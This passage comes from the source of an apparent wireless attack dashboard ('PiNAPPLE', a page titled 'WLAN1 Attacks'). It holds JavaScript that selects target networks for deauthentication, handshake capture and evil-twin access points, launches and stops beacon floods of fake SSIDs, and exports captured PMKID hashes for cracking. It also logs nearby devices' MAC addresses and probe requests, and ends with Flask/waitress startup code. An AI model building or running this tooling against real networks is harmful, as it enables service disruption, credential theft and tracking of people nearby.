      : '/api/wlan1/pcap/pmkid_hashes.hc22000';
    out.style.display = 'block';
    out.innerHTML = 'PMKID capture stopped and added to Saved. <br><a href="' + esc(href) + '" class="btn btn-acc" download style="margin-top:8px">Download hashes (' + esc(r.lines || 0) + ' lines)</a>';
    out.style.color = 'var(--grn)';
    toast('Hash file saved to Saved.', 'success', 5000);
  } else {
    out.style.display = 'block';
    out.textContent = 'Error: ' + ((r && r.error) || 'no capture found');
    out.style.color = 'var(--red)';
    toast('Could not convert capture: ' + ((r && r.error) || 'no capture found'), 'error', 7000);
  }
  refreshPmkidStatus();
  refreshWlan1Mode();
}

async function triggerScan(btn){
  const pane = (btn && btn.dataset && btn.dataset.pane) ? btn.dataset.pane : wlActiveTab;
  busy(btn, true, 'Scanning\u2026');
  const r = await api('/api/recon/scan', 'POST');
  busy(btn, false);
  if(r && r.ok){
    const extra = r.kept ? ' (kept ' + r.kept + ' previous)' : '';
    toast('Scan complete: ' + (r.count || 0) + ' networks' + extra, r.kept ? 'warn' : 'success');
  } else {
    toast('Scan failed: ' + ((r && r.error) || 'unknown'), 'error', 6000);
  }
  updateScanTable(pane);
  refreshWlan1Mode();
}

async function updateScanTable(pane){
  pane = pane || wlActiveTab;
  const t = document.querySelector('.scan-tbody[data-pane="' + pane + '"]');
  if(!t) return;
  const d = await loadRecon();
  if(!d.length){
    t.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No networks yet. Tap Rescan.</td></tr>';
    return;
  }
  t.innerHTML = d.slice().sort(function(a,b){ return (b.signal||0)-(a.signal||0); }).map(function(n){
    const bssid = esc(n.bssid || '');
    const ssid = esc(n.ssid || '');
    const channel = esc(n.channel || 6);
    const sig = esc((n.signal || 0) + ' ' + (n.signal_unit || ((n.signal || 0) < 0 ? 'dBm' : '%')));
    const vendor = n.vendor ? '<div class="hint" style="margin:0">' + esc(n.vendor) + '</div>' : '';
    return '<tr data-bssid="' + bssid + '" data-ssid="' + ssid + '" data-channel="' + channel + '">' +
      '<td>' + (n.ssid ? esc(n.ssid) : '&lt;hidden&gt;') + vendor + '</td>' +
      '<td><code>' + bssid + '</code></td>' +
      '<td>' + channel + '</td>' +
      '<td>' + sig + '</td>' +
      '<td><button class="btn btn-outline" style="padding:8px 12px" onclick="selectTargetRow(this)">Select</button></td>' +
      '</tr>';
  }).join('');
  labelTable(t.closest('table'));
}

function selectTargetRow(btn){
  const tr = btn.closest('tr');
  if(!tr) return;
  const b = tr.dataset.bssid || '';
  const s = tr.dataset.ssid || '';
  const c = tr.dataset.channel || '6';
  if(wlActiveTab === 'deauth'){
    document.getElementById('da-bssid').value = b;
    document.getElementById('da-channel').value = c;
  } else if(wlActiveTab === 'handshake'){
    document.getElementById('hs-bssid').value = b;
    document.getElementById('hs-channel').value = c;
  } else if(wlActiveTab === 'eviltwin'){
    document.getElementById('et-bssid').value = b;
    document.getElementById('et-ssid').value = s;
    document.getElementById('et-channel').value = c;
  } else if(wlActiveTab === 'beacon'){
    if(!s){ toast('That network hides its SSID; type a name instead.', 'warn'); return; }
    document.getElementById('bf-phrase').value = s;
    document.getElementById('bf-channels').value = c;
    bfUpdatePreview();
  }
  toast('Target selected: ' + (s || b), 'success');
}

async function refreshProbes(){
  if(document.visibilityState !== 'visible') return;
  if(wlActiveTab !== 'probes') return;
  const r = await fetch('/api/probes');
  const data = await r.json();
  const t = document.getElementById('probe-tbody');
  if(!t) return;
  if(!data.length){
    t.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No probes yet</td></tr>';
  } else {
    t.innerHTML = data.map(function(p){
      const vendor = p.vendor ? '<div class="hint" style="margin:0">' + esc(p.vendor) + '</div>' : '';
      return '<tr><td><code style="font-size:0.75rem">' + esc(p.mac) + '</code>' + vendor + '</td><td><strong>' + esc(p.ssid) + '</strong></td>' +
        '<td style="font-size:0.75rem;color:var(--dim)">' + esc(p.first_seen) + '</td><td style="font-size:0.75rem;color:var(--dim)">' + esc(p.last_seen) + '</td>' +
        '<td style="text-align:center">' + esc(p.count) + '</td></tr>';
    }).join('');
  }
  labelTable(t.closest('table'));
  const f = document.getElementById('probe-filter');
  if(f && f.value) filterTable('probe-tbody', f.value);
}

const ptColors = {'probe-req':'bb','beacon':'bg','data':'bw','deauth':'br','mgmt':''};
async function refreshTracker(){
  if(document.visibilityState !== 'visible') return;
  if(wlActiveTab !== 'tracker') return;
  const r = await fetch('/api/tracker');
  const data = await r.json();
  const t = document.getElementById('tracker-tbody');
  if(!t) return;
  if(!data.length){
    t.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--dim)">No devices seen yet</td></tr>';
  } else {
    t.innerHTML = data.slice(0,100).map(function(d){
      const types = Object.entries(d.packet_types || {}).sort(function(a,b){return b[1]-a[1];}).slice(0,4)
        .map(function(entry){ return '<span class="badge ' + (ptColors[entry[0]] || '') + '">' + esc(entry[0]) + '</span>'; }).join(' ');
      return '<tr><td><code style="font-size:0.75rem">' + esc(d.mac) + '</code>' + (d.vendor ? '<div class="hint" style="margin:0">' + esc(d.vendor) + '</div>' : '') + '</td>' +
        '<td style="font-size:0.75rem;color:var(--dim)">' + esc(d.first_seen) + '</td>' +
        '<td style="font-size:0.75rem;color:var(--dim)">' + esc(d.last_seen) + '</td>' +
        '<td>' + types + '</td><td style="font-size:0.75rem;color:var(--acc)">' + esc((d.ssids || []).slice(0,3).join(', ')) + '</td>' +
        '<td style="text-align:center">' + esc(d.count || 0) + '</td></tr>';
    }).join('');
  }
  labelTable(t.closest('table'));
  const f = document.getElementById('tracker-filter');
  if(f && f.value) filterTable('tracker-tbody', f.value);
}

function bfEl(id) { return document.getElementById(id); }

function bfClampCount(value) {
  const n = parseInt(value, 10);
  if (isNaN(n)) return 1;
  return Math.max(1, Math.min(200, n));
}

function bfStep(delta) {
  const input = bfEl('bf-count');
  if (!input) return;
  input.value = bfClampCount((parseInt(input.value, 10) || 1) + delta);
  bfUpdatePreview();
}

function bfUpdatePreview() {
  const phraseEl = bfEl('bf-phrase');
  const countEl = bfEl('bf-count');
  if (!phraseEl || !countEl) return;
  const phrase = (phraseEl.value || '').trim();
  const count = bfClampCount(countEl.value);
  const preview = bfEl('bf-preview');
  if (!preview) return;
  if (!phrase) {
    preview.textContent = count + ' copies will be created. Enter a name to see an example.';
  } else if (count === 1) {
    preview.textContent = 'One network: "' + phrase.slice(0, 32) + '"';
  } else {
    preview.textContent = count + ' networks: "' + phrase.slice(0, 28) + ' 1" \u2026 "' +
      phrase.slice(0, 28) + ' ' + count + '"';
  }
}

function bfShowError(message) {
  const box = bfEl('bf-error');
  if (!box) return;
  if (message) {
    box.textContent = message;
    box.style.display = 'block';
  } else {
    box.textContent = '';
    box.style.display = 'none';
  }
}

function bfSetRunning(running) {
  const startBtn = bfEl('bf-start');
  const stopBtn = bfEl('bf-stop');
  if (startBtn) startBtn.disabled = running;
  if (stopBtn) stopBtn.disabled = !running;
  const live = bfEl('bf-live');
  if (live) live.classList.toggle('is-running', running);
}

function bfFmtUptime(seconds) {
  seconds = Math.max(0, parseInt(seconds, 10) || 0);
  if (seconds < 60) return seconds + 's';
  const mins = Math.floor(seconds / 60);
  if (mins < 60) return mins + 'm ' + (seconds % 60) + 's';
  return Math.floor(mins / 60) + 'h ' + (mins % 60) + 'm';
}

function bfRenderStatus(d) {
  const running = !!(d && d.running);
  const ssids = (d && d.ssids) || [];
  const failed = (d && d.state) === 'error';

  bfSetRunning(running);
  const live = bfEl('bf-live');
  if (live) live.classList.toggle('is-error', failed && !running);

  const st = bfEl('bf-status');
  const sub = bfEl('bf-live-sub');
  const meta = bfEl('bf-live-meta');
  const chips = [];

  if (running) {
    if (st) {
      st.textContent = d.stalled ? 'Flooding \u2014 status heartbeat stalled' : 'Flooding now';
      st.style.color = d.stalled ? 'var(--warn)' : 'var(--grn)';
    }
    if (sub) {
      sub.textContent = (d.phrase ? '"' + d.phrase + '" \u2192 ' : '') + ssids.length +
        ' networks broadcasting on channel ' + (d.channel || (d.channels || []).join(',') || '?') + '.';
    }
    if (d.rate) chips.push('<span class="bf-chip"><strong>' + esc(d.rate) + '</strong> pps</span>');
    if (d.channel) chips.push('<span class="bf-chip">ch <strong>' + esc(d.channel) + '</strong></span>');
    if (d.uptime !== undefined) chips.push('<span class="bf-chip">up <strong>' + bfFmtUptime(d.uptime) + '</strong></span>');
    if (d.pid) chips.push('<span class="bf-chip">pid <strong>' + esc(d.pid) + '</strong></span>');
  } else if (failed) {
    if (st) { st.textContent = 'Stopped with an error'; st.style.color = 'var(--red)'; }
    if (sub) sub.textContent = d.error || 'The helper exited. Check the log below.';
  } else {
    if (st) { st.textContent = 'Idle'; st.style.color = 'var(--dim)'; }
    if (sub) sub.textContent = 'Ready to start';
  }
  if (meta) meta.innerHTML = chips.join('');

  const setText = function(id, value) { const el = bfEl(id); if (el) el.textContent = value; };
  setText('bf-stat-count', (running || failed) ? ssids.length : 0);
  setText('bf-stat-rate', (running && d.rate) ? d.rate : '\u2014');
  setText('bf-stat-channel', (running && d.channel) ? d.channel : '\u2014');
  setText('bf-stat-uptime', running ? bfFmtUptime(d.uptime) : '0s');

  const badges = bfEl('bf-active-ssids');
  const empty = bfEl('bf-empty');
  if (badges) {
    badges.innerHTML = !running ? '' : ssids.map(function (name) {
      const span = document.createElement('span');
      span.className = 'badge bb';
      span.textContent = name;
      return span.outerHTML;
    }).join(' ');
  }
  if (empty) empty.style.display = (running && ssids.length) ? 'none' : 'block';

  const log = bfEl('bf-log');
  if (log) {
    const tail = (d && d.log_tail) || '';
    log.textContent = tail;
    log.style.display = tail ? 'block' : 'none';
  }

  if (failed && d.error) bfShowError(d.error);
  if (running) bfShowError('');

  return running;
}

async function startFlood() {
  const phraseEl = bfEl('bf-phrase');
  const countEl = bfEl('bf-count');
  if (!phraseEl || !countEl) return;
  const phrase = (phraseEl.value || '').trim();
  const count = bfClampCount(countEl.value);
  const rate = parseInt(bfEl('bf-rate') && bfEl('bf-rate').value, 10) || 0;
  const channels = ((bfEl('bf-channels') && bfEl('bf-channels').value) || '').trim() || '6';
  const dwell = parseFloat(bfEl('bf-dwell') && bfEl('bf-dwell').value) || 8;
  const repeat = Math.max(1, Math.min(10, parseInt(bfEl('bf-repeat') && bfEl('bf-repeat').value, 10) || 1));

  bfShowError('');
  if (!phrase) {
    bfShowError('Enter a network name or phrase first.');
    toast('Enter a network name first.', 'warn');
    bfEl('bf-phrase').focus();
    return;
  }
  if (!confirm('Start flooding ' + count + ' fake networks named "' + phrase + '"?')) return;

  const startBtn = bfEl('bf-start');
  const stopBtn = bfEl('bf-stop');
  if (startBtn) startBtn.disabled = true;
  if (stopBtn) stopBtn.disabled = true;
  const st = bfEl('bf-status');
  const sub = bfEl('bf-live-sub');
  if (st) { st.textContent = 'Starting\u2026'; st.style.color = 'var(--warn)'; }
  if (sub) sub.textContent = 'Switching wlan1 and launching the beacon helper\u2026';

  try {
    const r = await api('/api/wlan1/beacon-flood/start', 'POST', {
      ssid: phrase, count: count, rate: rate,
      channels: channels, dwell: dwell, repeat: repeat
    });
    if (r && r.ok) {
      if (window.bfPoll) clearInterval(window.bfPoll);
      window.bfPoll = setInterval(updateBeaconStatus, 2000);
      bfRenderStatus(r);
      toast('Beacon flood started: ' + count + ' networks', 'success');
      refreshWlan1Mode();
    } else {
      bfSetRunning(false);
      if (st) { st.textContent = 'Could not start'; st.style.color = 'var(--red)'; }
      bfShowError((r && r.error) || 'Unknown error');
      toast('Could not start flood: ' + ((r && r.error) || 'unknown'), 'error', 7000);
      updateBeaconStatus();
    }
  } catch (e) {
    bfSetRunning(false);
    if (st) { st.textContent = 'Could not start'; st.style.color = 'var(--red)'; }
    bfShowError('Request failed: ' + (e && e.message ? e.message : e));
    toast('Could not start flood: ' + (e && e.message ? e.message : e), 'error', 7000);
  }
}

async function stopFlood() {
  if (!confirm('Stop the beacon flood and restore wlan1?')) return;
  if (window.bfPoll) { clearInterval(window.bfPoll); window.bfPoll = null; }
  const startBtn = bfEl('bf-start');
  const stopBtn = bfEl('bf-stop');
  if (startBtn) startBtn.disabled = true;
  if (stopBtn) stopBtn.disabled = true;
  const st = bfEl('bf-status');
  const sub = bfEl('bf-live-sub');
  if (st) { st.textContent = 'Stopping\u2026'; st.style.color = 'var(--warn)'; }
  if (sub) sub.textContent = 'Ending the flood and restoring wlan1.';

  try {
    const r = await api('/api/wlan1/beacon-flood/stop', 'POST');
    bfRenderStatus((r && r.status) || {running: false});
    toast('Beacon flood stopped.', 'success');
  } catch (e) {
    bfRenderStatus({running: false});
    bfShowError('Stop request failed: ' + (e && e.message ? e.message : e));
    toast('Stop request failed.', 'error', 6000);
  }
  bfSetRunning(false);
  if (st) { st.textContent = 'Stopped'; st.style.color = 'var(--dim)'; }
  if (sub) sub.textContent = 'Ready to start';
  refreshWlan1Mode();
}

async function updateBeaconStatus() {
  if (document.visibilityState !== 'visible') return;
  try {
    const r = await fetch('/api/wlan1/beacon-flood/status', {headers: {'Accept': 'application/json'}});
    if (!r.ok) throw new Error('status ' + r.status);
    const d = await r.json();
    const running = bfRenderStatus(d);

    if (!running) {
      window.bfHydrated = false;
    } else if (!window.bfHydrated) {
      window.bfHydrated = true;
      if (d.phrase && bfEl('bf-phrase')) bfEl('bf-phrase').value = d.phrase;
      if (d.count && bfEl('bf-count')) bfEl('bf-count').value = d.count;
      bfUpdatePreview();
    }
    if (running) {
      if (!window.bfPoll) window.bfPoll = setInterval(updateBeaconStatus, 2000);
    } else if (window.bfPoll) {
      clearInterval(window.bfPoll);
      window.bfPoll = null;
    }
  } catch (e) {
    // Keep the last known state; the next poll may recover.
  }
}

(function initWlan1UI(){
  const initial = new URLSearchParams(window.location.search).get('tab') || 'probes';
  showWlan1Tab(initial, false);

  document.querySelectorAll('.wl-tab').forEach(function(a){
    a.setAttribute('role', 'tab');
  });

  refreshWlan1Mode();
  updateScanTable(initial);
  refreshDeauthJobs();
  refreshEvilTwinStatus();
  refreshPmkidStatus();
  rehydrateHandshake();
  daUpdateEstimate();
  labelTables();

  setInterval(refreshWlan1Mode, 15000);
  setInterval(refreshProbes, 5000);
  setInterval(refreshTracker, 10000);
  setInterval(function(){
    if(['deauth','handshake','eviltwin','beacon'].indexOf(wlActiveTab) >= 0) updateScanTable(wlActiveTab);
  }, 30000);

  const phrase = bfEl('bf-phrase');
  const count = bfEl('bf-count');
  if (phrase) phrase.addEventListener('input', bfUpdatePreview);
  if (count) {
    count.addEventListener('input', bfUpdatePreview);
    count.addEventListener('blur', function () {
      count.value = bfClampCount(count.value);
      bfUpdatePreview();
    });
  }
  bfUpdatePreview();
  bfSetRunning(false);
  updateBeaconStatus();
})();
</script>"""

    return page('WLAN1 Attacks', content, active_tab, js)

if __name__ == '__main__':
    for directory in ('/var/log/pinapple', '/etc/pinapple', SAVED_DIR):
        try:
            os.makedirs(directory, exist_ok=True)
        except OSError:
            pass
    ensure_config()
    restore_network_flags()
    reconcile_eviltwin_state()
    cleanup_orphan_handshakes()
    cleanup_orphan_beacon()
    reconcile_wlan1_owner()
    restore_wlan1_idle()
    threading.Thread(target=watchdog_loop, daemon=True).start()
    audit('Dashboard started')
    try:
        from waitress import serve
    except ImportError:
        # threaded=True matters: requests share in-memory wlan1 job state.
        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
    else:
        print('PiNAPPLE dashboard serving on 0.0.0.0:8080 (waitress)', flush=True)
        serve(app, host='0.0.0.0', port=8080, threads=8)